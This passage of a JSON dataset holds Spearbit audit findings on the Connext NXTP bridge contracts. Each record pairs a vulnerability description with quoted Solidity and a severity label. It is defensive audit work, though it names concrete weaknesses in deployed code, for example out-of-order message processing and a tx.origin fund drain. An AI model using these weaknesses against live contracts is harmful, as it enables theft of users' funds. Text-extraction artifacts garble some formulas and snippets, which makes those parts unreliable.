        "body": "Once a swap is initialized by the owner or an admin (indexed by the key parameter) the _pooledTo- kens or the set of tokens used in this stable swap pool cannot be updated. Now the s.swapStorages[_key] pools are used in other facets for assets that have the hash of their canonical token id and canonical domain equal to _key, for example when we need to swap between a local and adopted asset or when a user provides liquidity or interact with other external endpoints of StableSwapFacet. If the submitted set of tokens to this pool _pooledTokens beside the local and adopted token corresponding to _key include some other bad/malicious tokens, users' funds can be at risk in the pool in question. If this happens, we need to pause the protocol, push an update, and initializeSwap again.",
        "labels": [
            "Spearbit",
            "ConnextNxtp",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "An incorrect decimal supplied to initializeSwap for a token cannot be corrected",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf",
        "body": "Once a swap is initialized by the owner or an admin (indexed by the key parameter) the decimal precisions per tokens, and therefore tokenPrecisionMultipliers cannot be changed. If the supplied decimals also include a wrong value, it would cause incorrect calculation when a swap is being made and currently there is no update mechanism for tokenPrecisionMultipliers nor a mechanism for removing the swapStorages[_key].",
        "labels": [
            "Spearbit",
            "ConnextNxtp",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "Presence of delegate not enforced",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf",
        "body": "A delegate address on the destination chain can be used to fix stuck transactions by changing the slippage limits and by re-executing transactions. However, the presence of a delegate address isn't checked in _xcall(). Note: set to medium risk because tokens could get lost 23 function forceUpdateSlippage(TransferInfo calldata _params, uint256 _slippage) external ,! onlyDelegate(_params) { ... } function execute(ExecuteArgs calldata _args) external nonReentrant whenNotPaused returns (bytes32) { (bytes32 transferId, DestinationTransferStatus status) = _executeSanityChecks(_args); ... } function _executeSanityChecks(ExecuteArgs calldata _args) private view returns (bytes32, ,! DestinationTransferStatus) { // If the sender is not approved relayer, revert if (!s.approvedRelayers[msg.sender] && msg.sender != _args.params.delegate) { revert BridgeFacet__execute_unapprovedSender(); } }",
        "labels": [
            "Spearbit",
            "ConnextNxtp",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "Relayer could lose funds",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf",
        "body": "The xReceive function on the receiver side can contain unreliable code which Relayer is unaware of. In the future, more relayers will participate in completing the transaction. Consider the following scenario: 1. Say that Relayer A executes the xReceive function on receiver side. 2. In the xReceive function, a call to withdraw function in a foreign contract is made where Relayer A is holding some balance. 3. If this foreign contract is checking tx.origin (say deposit/withdrawal were done via third party), then Relayer A's funds will be withdrawn without his permission (since tx.origin will be the Relayer).",
        "labels": [
            "Spearbit",
            "ConnextNxtp",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "TypedMemView.sameType does not use the correct right shift value to compare two bytes29s",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf",
        "body": "The function sameType should shift 2 x 12 + 3 bytes to access the type flag (TTTTTTTTTT) when comparing it to 0. This is due to the fact that when using bytes29 type in bitwise operations and also comparisons to 0, a paramater of type bytes29 is zero padded from the right so that it fits into a uint256 under the hood. 0x TTTTTTTTTT AAAAAAAAAAAAAAAAAAAAAAAA LLLLLLLLLLLLLLLLLLLLLLLL 00 00 00 Currently, sameType only shifts the xored value 2 x 12 bytes so the comparison compares the type flag and the 3 leading bytes of memory address in the packing specified below: // First 5 bytes are a type flag. // - ff_ffff_fffe is reserved for unknown type. // - ff_ffff_ffff is reserved for invalid types/errors. // next 12 are memory address // next 12 are len // bottom 3 bytes are empty The function is not used in the codebase but can pose an important issue if incorporated into the project in the future. function sameType(bytes29 left, bytes29 right) internal pure returns (bool) { return (left ^ right) >> (2 * TWELVE_BYTES) == 0; }",
        "labels": [
            "Spearbit",
            "ConnextNxtp",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "Incorrect formula for the scaled amplification coefficient in NatSpec comments",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf",
        "body": "In the context above, the scaled amplification coefficient a is described by the formula An(n (cid:0) 1) where A is the actual amplification coefficient in the stable swap invariant equation for n tokens. * @param a the amplification coefficient * n * (n - 1) ... The actual adjusted/scaled amplification coefficient would need to be Ann(cid:0)1 and not An(n (cid:0) 1), otherwise, most of the calculations done when swapping between 2 tokens in a pool with more than 2 tokens would be wrong. For the special case of n = 2, those values are actually equal 22(cid:0)1 = 2 = 2 (cid:1) 1. So for swaps or pools that involve only 2 tokens, the issue in the comment is not so critical. But if the number of tokens are more than 2, then we need to make sure we calculate and feed the right parameter to AppStorage.swapStorages.{initial, future}A",
        "labels": [
            "Spearbit",
            "ConnextNxtp",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "RootManager.propagate does not operate in a fail-safe manner",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf",
        "body": "A bridge failure on one of the supported chains will cause the entire messaging network to break down. When the RootManager.propagate function is called, it will loop through the hub connector of all six chains (Ar- bitrum, Gnosis, Multichain, Optimism, Polygon, ZKSync) and attempt to send over the latest aggregated root by making a function call to the respective chain's AMB contract. There is a tight dependency between the chain's AMB and hub connector. The problem is that if one of the function calls to the chain's AMB contract reverts (e.g. one of the bridges is paused), the entire RootManager.propagate function will revert, and the messaging network will stop working until someone figure out the problem and manually removes the problematic hub connector. As Connext grows, the number of chains supported will increase, and the risk of this issue occurring will also increase.",
        "labels": [
            "Spearbit",
            "ConnextNxtp",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "Arborist once whitelisted cannot be removed",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf",
        "body": "Arborist has the power to write over the Merkle root. In case Arborist starts misbehaving (compro- mised or security issue) then there is no way to remove this Arborist from the whitelist.",
        "labels": [
            "Spearbit",
            "ConnextNxtp",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "WatcherManager is not set correctly",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf",
        "body": "The setWatcherManager function missed to actually update the watcherManager, instead it is just emitting an event mentioning that Watcher Manager is updated when it is not. This could become a problem once new modules are added/revised in WatcherManager contract and Watcher- Client wants to use this upgraded WatcherManager. WatcherClient will be forced to use the outdated Watcher- Manager contract code.",
        "labels": [
            "Spearbit",
            "ConnextNxtp",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "Check __GAPs",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf",
        "body": "All __GAPs have the same size, while the different contracts have a different number of storage variables. If the __GAP size isn't logical it is more difficult to maintain the code. Note: set to a risk rating of medium because the probably of something going wrong with future upgrades is low to medium, and the impact of mistakes would be medium to high. LPToken.sol: uint256[49] private __GAP; // should probably be 50 OwnerPausableUpgradeable.sol: uint256[49] private __GAP; // should probably be 50 uint256[49] private __GAP; // should probably be 48 StableSwap.sol: uint256[49] private __GAP; // should probably be 48 Merkle.sol: uint256[49] private __GAP; // should probably be 47 ProposedOwnable.sol: 27",
        "labels": [
            "Spearbit",
            "ConnextNxtp",
            "Severity: Medium Risk LPToken.sol#L16, OwnerPausableUpgradeable.sol#L16, StableSwap.sol#L39, Merkle.sol#L37,"
        ]
    },
    {
        "title": "Message can be delivered out of order",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf",
        "body": "Messages can be delivered out of order on the spoke. Anyone can call the permissionless prove- AndProcess to process the messages in any order they want. A malicious user can force the spoke to process messages in a way that is beneficial to them (e.g., front-run).",
        "labels": [
            "Spearbit",
            "ConnextNxtp",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "Extra checks in _verifySender() of GnosisBase",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf",
        "body": "According to the Gnosis bridge documentation the source chain id should also be checked using messageSourceChainId(). This is because in the future the same arbitrary message bridge contract could handle requests from different chains. If a malicious actor would be able to have access to the contract at mirrorConnector on a to-be-supported chain that is not the MIRROR_DOMAIN, they can send an arbitrary root to this mainnet/L1 hub connector which the con- nector would mark it as coming from the MIRROR_DOMAIN. So the attacker can spoof/forge function calls and asset transfers by creating a payload root and using this along with their access to mirrorConnector on chain to send a cross-chain processMessage to the Gnosis hub connector and after they can use their payload root and proofs to forge/spoof transfers on the L1 chain. Although it is unlikely that any other party could add a contract with the same address as _amb on another chain, it is safer to add additional checks. function _verifySender(address _amb, address _expected) internal view returns (bool) { require(msg.sender == _amb, \"!bridge\"); return GnosisAmb(_amb).messageSender() == _expected; } 28",
        "labels": [
            "Spearbit",
            "ConnextNxtp",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "Absence of Minimum delayBlocks",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf",
        "body": "Owner can accidentally set delayBlocks as 0 (or a very small delay block) which will collapse the whole fraud protection mechanism. Since there is no check for minimum delay before setting a new delay value so even a low value will be accepted by setDelayBlocks function function setDelayBlocks(uint256 _delayBlocks) public onlyOwner { require(_delayBlocks != delayBlocks, \"!delayBlocks\"); emit DelayBlocksUpdated(_delayBlocks, delayBlocks); delayBlocks = _delayBlocks; }",
        "labels": [
            "Spearbit",
            "ConnextNxtp",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "Add extra 0 checks in verifyAggregateRoot() and proveMessageRoot()",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf",
        "body": "The functions verifyAggregateRoot() and proveMessageRoot() verify and confirm roots. A root value of 0 is a special case. If this value would be allowed, then the functions could allow invalid roots to be passed. Currently the functions verifyAggregateRoot() and proveMessageRoot() don't explicitly verify the roots are not 0. 29 function verifyAggregateRoot(bytes32 _aggregateRoot) internal { if (provenAggregateRoots[_aggregateRoot]) { return; } ... // do several verifications provenAggregateRoots[_aggregateRoot] = true; ... } function proveMessageRoot(...) ... { if (provenMessageRoots[_messageRoot]) { return; } ... // do several verifications provenMessageRoots[_messageRoot] = true; }",
        "labels": [
            "Spearbit",
            "ConnextNxtp",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "_removeAssetId() should also clear custodied",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf",
        "body": "In one of the fixes in PR 2530, _removeAssetId() doesn't clear custodied as it is assumed to be 0. function _removeAssetId(...) ... { // NOTE: custodied will always be 0 at this point } However custodied isn't always 0. Suppose cap & custodied have a value (!=0), then _setLiquidityCap() is called to set the cap to 0. The function doesn't reset the custodied value so it will stay at !=0.",
        "labels": [
            "Spearbit",
            "ConnextNxtp",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Remove liquidity while paused",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf",
        "body": "The function removeLiquidity() in StableSwapFacet.sol has a whenNotPaused modifier, while the comment shows Liquidity can always be removed, even when the pool is paused.. On the other hand function removeLiquidity() in StableSwap.sol doesn't have this modifier. StableSwapFacet.sol#L394-L446 // Liquidity can always be removed, even when the pool is paused. function removeLiquidity(...) external ... nonReentrant whenNotPaused ... { ... } function removeLiquidityOneToken(...) external ... nonReentrant whenNotPaused function removeLiquidityImbalance(...) external ... nonReentrant whenNotPaused ... { ... } ... { ... } StableSwap.sol#L394-L446 // Liquidity can always be removed, even when the pool is paused. function removeLiquidity(...) external ... nonReentrant ... { ... } function removeLiquidityOneToken(...) external ... nonReentrant whenNotPaused function removeLiquidityImbalance(...) external ... nonReentrant whenNotPaused ... { ... } ... { ... }",
        "labels": [
            "Spearbit",
            "ConnextNxtp",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Relayers can frontrun each other's calls to BridgeFacet.execute",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf",
        "body": "Relayers can front run each other's calls to BridgeFacet.execute. Currently, there is no on-chain mechanism to track how many fees should be allocated to each relayer. All the transfer bump fees are funneled into one address s.relayerFeeVault.",
        "labels": [
            "Spearbit",
            "ConnextNxtp",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "OptimismHubConnector.processMessageFromRoot emits MessageProcessed for already processed messages",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf",
        "body": "Calls to processMessageFromRoot with an already processed _data still emit MessageProcessed. This might cause issues for off-chain agents like relayers monitoring this event.",
        "labels": [
            "Spearbit",
            "ConnextNxtp",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Add max cap for domains",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf",
        "body": "Currently there isn't any cap on the maximum amount of domains which system can support. If the size of the domains and connectors grow, at some point due to out-of-gas errors in updateHashes function, both addDomain and removeDomain could DOS.",
        "labels": [
            "Spearbit",
            "ConnextNxtp",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "In certain scenarios calls to xcall... or addRouterLiquidity... can be DoSed",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf",
        "body": "The owner or an admin can frontrun (or it can be by an accident) a call that:  A router has made on a canonical domain of a canonical token to supply that token as liquidity OR  A user has made to xcall... supplying a canonical token on its canonical domain. The frontrunning call would set the cap to a low number (calling updateLiquidityCap). This would cause the calls mentioned in the bullet list to fail due to the checks against IERC20(_local).balanceOf(address(this)).",
        "labels": [
            "Spearbit",
            "ConnextNxtp",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Missing a check against address(0) in ConnextPriceOracle's constructor",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf",
        "body": "When ConnextPriceOracle is deployed an address _wrapped is passed to its constructor. The current codebase does not check whether the passed _wrapped can be an address(0) or not.",
        "labels": [
            "Spearbit",
            "ConnextNxtp",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "_executeCalldata() can revert if insufficient gas is supplied",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf",
        "body": "The function _executeCalldata() contains the statement gasleft() - 10_000. This statement can revert if the available gas is less than 10_000. Perhaps this is the expected behaviour. Note: From the Tangerine Whistle fork only a maximum 63/64 of the available gas is sent to contract being called. Therefore, 1/64th is left for the calling contract. function _executeCalldata(...) ... { ... (success, returnData) = ExcessivelySafeCall.excessivelySafeCall(_params.to, gasleft() - 10_000, ... ); ... ,! }",
        "labels": [
            "Spearbit",
            "ConnextNxtp",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Be aware of precompiles",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf",
        "body": "The external calls by _executeCalldata() could call a precompile. Different chains have creative precompile implementations, so this could in theory pose problems. For example precompile 4 copies memory: what-s-the-identity-0x4-precompile Note: precompiles link to dedicated pieces of code written in Rust or Go that can be called from the EVM. Here are a few links for documentation on different chains: moonbeam precompiles, astar precompiles function _executeCalldata(...) ... { ... (success, returnData) = ExcessivelySafeCall.excessivelySafeCall( _params.to, ...); } else { returnData = IXReceiver(_params.to).xReceive(...); } ... }",
        "labels": [
            "Spearbit",
            "ConnextNxtp",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Upgrade to solidity 0.8.17",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf",
        "body": "Solidity 0.8.17 released a bugfix where the optimizer could incorrectly remove storage writes if the code fit a certain pattern (see this security alert). This bug was introduced in 0.8.13. Since Connext is using the legacy code generation pipeline, i.e., compiling without the via-IR flag, the current code is not at risk. This is because assembly blocks dont write to storage. However, if this changes and Connext compiles through via-IR code generation, the code is more likely to be affected. One reason to use this code generation pipeline could be to enable gas optimizations not available in legacy code generation.",
        "labels": [
            "Spearbit",
            "ConnextNxtp",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Add domain check in setupAssetWithDeployedRepresentation()",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf",
        "body": "The function setupAssetWithDeployedRepresentation() links a new _representation asset. However this should not be done on the canonical domain. So good to check this to prevent potential mistakes. function setupAssetWithDeployedRepresentation(...) ... { bytes32 key = _enrollAdoptedAndLocalAssets(_adoptedAssetId, _representation, _stableSwapPool, _canonical); ... ,! }",
        "labels": [
            "Spearbit",
            "ConnextNxtp",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "If an adopted token and its canonical live on the same domain the cap for the custodied amount is applied for each of those tokens",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf",
        "body": "If _local is an adopted asset that lives on its canonical's original chain, then we are comparing the to-be-updated balance of this contract (custodied) with s.caps[key]. That means we are also comparing the balance of an adopted asset with the property above with the cap. For example, if A is the canonical token and B the adopted, then cap = s.caps[key] is used to cap the custodied amount in this contract for both of those tokens. So if the cap is 1000, the contract can have a balance of 1000 A and 1000 B, which is twice the amount meant to be capped. This is true basically for any approved asset with the above properties. When the owner or the admin calls setu- pAsset: // File: https://github.com/connext/nxtp/blob/32a0370edc917cc45c231565591740ff274b5c05/packages/deploym ents/contracts/contracts/core/connext/facets/TokenFacet.sol#L164-L172 ,! function setupAsset( c TokenId calldata _canonical, uint8 _canonicalDecimals, string memory _representationName, string memory _representationSymbol, address _adoptedAssetId, address _stableSwapPool, uint256 _cap ) external onlyOwnerOrAdmin returns (address _local) { such that _canonical.domain == s.domain and _adoptedAssetId != 0, then this asset has the property in ques- tion.",
        "labels": [
            "Spearbit",
            "ConnextNxtp",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "There are no checks/constraints against the _representation provided to setupAssetWithDe- ployedRepresentation",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf",
        "body": "setupAssetWithDeployedRepresentation is similar to setupAsset in terms of functionality, except it does not deploy a representation token if necessary. It actually uses the _representation address given as the representation token. The _representation parameter given does not have any checks in terms of functionality compared to when setupAsset which deploys a new BridgeToken instance: // File: packages\\deployments\\contracts\\contracts\\core\\connext\\facets\\TokenFacet.sol#L399 _token = address(new BridgeToken(_decimals, _name, _symbol)); Basically, representation needs to implement IBridgeToken (mint, burn, setDetails, ... ) and some sort of IERC20. Otherwise, if a function from IBridgeToken is not implemented or if it does not have IERC20 functionality, it can cause failure/reverts in some functions in this codebase. Another thing that is important is that the decimals for _representation should be equal to the decimals precision of the canonical token. And that _representation should not be able to update/change its decimals. Also, this opens an opportunity for a bad owner or admin to provide a malicious _representation to this function. This does not have to be a malicious act, it can also happen by mistake from for example an admin. Additionally the Connext Diamond must have the \"right\" to mint() and burn() the tokens.",
        "labels": [
            "Spearbit",
            "ConnextNxtp",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "In dequeueVerified when no verified items are found in the queue last == first - 1",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf",
        "body": "The comment in dequeueVerified mentions that when no verified items are found in the queue, then last == first. But this is not true since the loop condition is last >= first and the loop only terminates (not considering the break) when last == first - 1. It is important to correct this incorrect statement in the comment, since a dev/user can by mistake take this state- ment as true and modify/use the code with this incorrect assumption in mind.",
        "labels": [
            "Spearbit",
            "ConnextNxtp",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Dirty bytes in _loc and _len can override other values when packing a typed memory view in unsafeBuildUnchecked",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf",
        "body": "For a TypeedMemView, the location and the length are supposed to occupy 12 bytes (uint96), but the type used for these values for the input parameters for unsafeBuildUnchecked is uint256. This would allow those values to carry dirty bytes and when the following calculations are performed: newView := shl(96, or(newView, _type)) // insert type newView := shl(96, or(newView, _loc)) // insert loc newView := shl(24, or(newView, _len)) // empty bottom 3 bytes _loc can potentially manipulate the type section of the view and _len can potentially manipulate both the _loc and the _type section.",
        "labels": [
            "Spearbit",
            "ConnextNxtp",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "To use sha2, hash160 and hash256 of TypedMemView the hard-coded precompile addresses would need to be checked to make sure they return the corresponding hash values.",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf",
        "body": "sha2, hash160 and hash256 assume that the precompile contracts at address(2) and address(3) calculate and return the sha256 and ripemd160 hashes of the provided memory chunks. These assumptions depend on the chain that the project is going to be deployed on.",
        "labels": [
            "Spearbit",
            "ConnextNxtp",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "sha2, hash160 and hash256 of TypedMemView.sha2 do not clear the memory after calculating the hash",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf",
        "body": "When a call to the precompile contract at address(2) (or at address(3)) is made, the returned value is placed at the slot pointed by the free memory pointer and then placed on the stack. The free memory pointer is not incremented to account for this used memory position nor the code tries to clean this memory slot of 32 bytes. Therefore after a call to sha2, hash160 or hash256, we would end up with dirty bytes.",
        "labels": [
            "Spearbit",
            "ConnextNxtp",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Fee on transfer token support",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf",
        "body": "It seems that only the addLiquidity function is currently supporting the fee on transfer token. All operations like swapping are prohibiting the fee on transfer token. Note: The SwapUtilsExternal.sol contract allow fee on transfer token and as per product team, this is expected from this token",
        "labels": [
            "Spearbit",
            "ConnextNxtp",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Fee on transfer tokens can stuck the transaction",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf",
        "body": "Consider the following scenario. 1. Assume User has made a xcall with amount A of token X with calldata C1. Since their was no fee while transferring funds, transfer was a success. 2. Now, before this amount can be transferred on the destination domain,token X introduced a fee on transfer. 3. Relayer now executes this transaction on destination domain via _handleExecuteTransaction function on BridgeFacet.sol#L756. 4. This transfers the amount A of token X to destination domain but since now the fee on this token has been introduced, destination domain receives amount A-delta. 5. This calldata is called on destination domain but the amount passed is A instead of A-delta so if the IXRe- ceiver has amount check then it will fail because it will now expect A amount when it really got A-delta amount.",
        "labels": [
            "Spearbit",
            "ConnextNxtp",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Initial Liquidity Provider can trick the system",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf",
        "body": "Since there is no cap on the amount which initial depositor can deposit, an attacker can trick the system in bypassing admin fees for other users by selling liquidity at half admin fees. Consider the following scenario. 1. User A provides the first liquidity of a huge amount. 2. Since there aren't any fees from initial liquidity, admin fees are not collected from User A. 3. Now User A can sell his liquidity to other users with half admin fees. 4. Other users can mint larger liquidity due to lesser fees and User A also get benefit of adminFees/2.",
        "labels": [
            "Spearbit",
            "ConnextNxtp",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Ensure non-zero local asset in _xcall()",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf",
        "body": "Local asset fetched in _xcall() is not verified to be a non-zero address. In case, if token mappings are not updated correctly and to future-proof from later changes, it's better to revert if a zero address local asset is fetched. local = _getLocalAsset(key, canonical.id, canonical.domain);",
        "labels": [
            "Spearbit",
            "ConnextNxtp",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Use ExcessivelySafeCall to call xReceive()",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf",
        "body": "xReceive(). This is done to avoid copying large amount of return data in memory. This same attack vector exists for non-reconciled transfers, however in this case a usual function call is made for xReceive(). For However, in case non-reconciled calls fail due to this error, they can always be retried after reconciliation.",
        "labels": [
            "Spearbit",
            "ConnextNxtp",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "A router's liquidity might get trapped if the router is removed",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf",
        "body": "If the owner or a user with Role.Router Role removes a router that does not implement calling re- moveRouterLiquidity or removeRouterLiquidityFor, then any liquidity remaining in the contract for the removed router cannot be transferred back to the router.",
        "labels": [
            "Spearbit",
            "ConnextNxtp",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "In-flight transfers by the relayer can be reverted when setMaxRoutersPerTransfer is called before- hand by a lower number",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf",
        "body": "For in-flight transfers where an approved sequencer has picked and signed an x number of routers for a transfer, from the time a relayer or another 3rd party grabs this ExecuteArgs _args to the time this party submits it to the destination domain by calling execute on a connext instance, the owner or an admin can call setMaxRoutersPerTransfer with a number lower than x on purpose or not. And this would cause the call to execute to revert with BridgeFacet__execute_maxRoutersExceeded.",
        "labels": [
            "Spearbit",
            "ConnextNxtp",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "All the privileged users that can call withdrawSwapAdminFees would need to trust each other",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf",
        "body": "The owner needs to trust all the admins and also all admins need to trust each other. Since any admin can call withdrawSwapAdminFees endpoint to withdraw all the pool's admin fees into their account.",
        "labels": [
            "Spearbit",
            "ConnextNxtp",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "The supplied _a to initializeSwap cannot be directly updated but only ramped",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf",
        "body": "Once a swap is initialized by the owner or an admin (indexed by the key parameter) the supplied _a (the scaled amplification coefficient, Ann(cid:0)1 ) to initializeSwap cannot be directly updated but only ramped. The owner or the admin can still call rampA to update _a, but it will take some time for it to reach the desired value. This is mostly important if by mistake an incorrect value for _a is provided to initializeSwap.",
        "labels": [
            "Spearbit",
            "ConnextNxtp",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Inconsistent behavior when xcall with a non-existent _params.to",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf",
        "body": "A xcall with a non-existent _params.to behaves differently depending on the path taken. 1. Fast Liquidity Path - Use IXReceiver(_params.to).xReceive. The _executeCalldata function will revert if _params.to is non-existent. Which technically means that the execution has failed. 2. Slow Path - Use ExcessivelySafeCall.excessivelySafeCall. This function uses the low-level call, which will not revert and will return true if the _params.to is non-existent. The _executeCalldata function will return with success set to True, which means the execution has succeeded.",
        "labels": [
            "Spearbit",
            "ConnextNxtp",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "The lpToken cloned in initializeSwap cannot be updated",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf",
        "body": "Once a swap is initialized by the owner or an admin (indexed by the key parameter) an LPToken lpToken is created by cloning the provided lpTokenTargetAddress to the initializeSwap endpoint. There is no restriction on lpTokenTargetAddress except that it would need to be of LPToken like, but it can be malicious under the hood or have some security vulnerabilities, so it can not be trusted.",
        "labels": [
            "Spearbit",
            "ConnextNxtp",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Lack of zero check",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf",
        "body": "Consider the following scenarions.  Instance 1 - BridgeFacet.addSequencer The addSequencer function of BridgeFacet.sol does not check that the sequencer address is not zero before adding them. function addSequencer(address _sequencer) external onlyOwnerOrAdmin { if (s.approvedSequencers[_sequencer]) revert BridgeFacet__addSequencer_alreadyApproved(); s.approvedSequencers[_sequencer] = true; emit SequencerAdded(_sequencer, msg.sender); } If there is a mistake during initialization or upgrade, and set s.approvedSequencers[0] = true, anyone might be able to craft a payload to execute on the bridge because the attacker can bypass the following validation within the execute function. if (!s.approvedSequencers[_args.sequencer]) { revert BridgeFacet__execute_notSupportedSequencer(); }  Instance 2 - BridgeFacet.enrollRemoteRouter 43 The enrollRemoteRouter function of BridgeFacet.sol does not check that the domain or router address is not zero before adding them. function enrollRemoteRouter(uint32 _domain, bytes32 _router) external onlyOwnerOrAdmin { // Make sure we aren't setting the current domain as the connextion. if (_domain == s.domain) { revert BridgeFacet__addRemote_invalidDomain(); } s.remotes[_domain] = _router; emit RemoteAdded(_domain, TypeCasts.bytes32ToAddress(_router), msg.sender); }  Instance 3 - TokenFacet._enrollAdoptedAndLocalAssets The _enrollAdoptedAndLocalAssets function of TokenFacet.sol does not check that the _canonical.domain and _canonical.id are not zero before adding them. function _enrollAdoptedAndLocalAssets( address _adopted, address _local, address _stableSwapPool, TokenId calldata _canonical ) internal returns (bytes32 _key) { // Get the key _key = AssetLogic.calculateCanonicalHash(_canonical.id, _canonical.domain); // Get true adopted address adopted = _adopted == address(0) ? _local : _adopted; // Sanity check: needs approval if (s.approvedAssets[_key]) revert TokenFacet__addAssetId_alreadyAdded(); // Update approved assets mapping s.approvedAssets[_key] = true; // Update the adopted mapping using convention of local == adopted 